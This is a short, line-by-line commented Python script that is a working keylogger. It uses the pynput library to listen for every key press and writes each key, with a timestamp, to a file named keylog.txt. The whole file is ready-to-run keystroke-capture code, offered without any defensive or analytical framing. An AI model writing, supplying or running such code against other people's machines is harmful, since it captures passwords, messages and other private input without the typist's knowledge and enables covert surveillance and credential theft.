# Import necessary modules
from pynput.keyboard import Key, Listener  # Import Key and Listener from pynput.keyboard
import logging  # Import the logging module

# Configure logging settings
logging.basicConfig(filename=("keylog.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
# Set up logging to a file named "keylog.txt", capturing messages of DEBUG level and higher,
# with a specific format including timestamp and log message.

# Define a function to be called when a key is pressed
def on_press(key):
    logging.info(str(key))
    # Log information about the pressed key at the INFO level, converting the key to a string.

# Set up a key-press listener
with Listener(on_press=on_press) as listener:
    listener.join()
    # Use a context manager to create a Listener object with the defined on_press function.
    # Start the listener and keep the program running until the listener is stopped.
